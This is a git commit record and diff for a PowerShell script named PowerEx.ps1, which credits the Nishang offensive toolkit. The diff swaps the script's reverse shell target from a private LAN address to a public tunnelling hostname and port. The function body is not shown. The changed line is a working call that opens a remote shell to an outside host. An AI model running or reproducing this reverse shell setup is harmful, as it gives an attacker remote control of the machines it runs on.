f934a3a11b83931755e19d2f9c92398712430893
icss-tishan <tishan.icss@gmail.com>
2025-05-24 17:29:52 +0530

    Update PowerEx.ps1

--- PowerEx.ps1
+++ PowerEx.ps1
@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Power -Reverse -IPAddress 192.168.10.143 -Port 9001
+Power -Reverse -IPAddress rnuhz-115-187-63-108.a.free.pinggy.link -Port 38719
